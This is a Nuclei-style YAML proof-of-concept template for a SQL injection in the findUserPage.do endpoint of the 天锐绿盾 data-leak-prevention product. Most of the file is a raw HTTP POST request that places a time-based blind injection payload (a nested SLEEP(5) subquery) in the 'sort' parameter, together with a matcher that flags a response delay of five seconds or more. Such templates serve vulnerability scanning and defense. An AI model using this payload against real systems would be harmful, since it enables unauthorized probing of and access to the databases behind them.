id: poc-ul8xvum6tatgi3vr
info:
  name: 天锐绿盾findUserPage存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /trwfe/user/findUserPage.do HTTP/1.1

    Host: {{Hostname}}

    Cookie: JSESSIONID=; lang=zh-CN; sid=

    Accept-Language: zh-CN,zh;q=0.9

    X-Requested-With: XMLHttpRequest

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Encoding: gzip, deflate


    userName=&deptId=0&page=1&rows=10&sort=(SELECT * FROM (SELECT(SLEEP(5)))x)'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
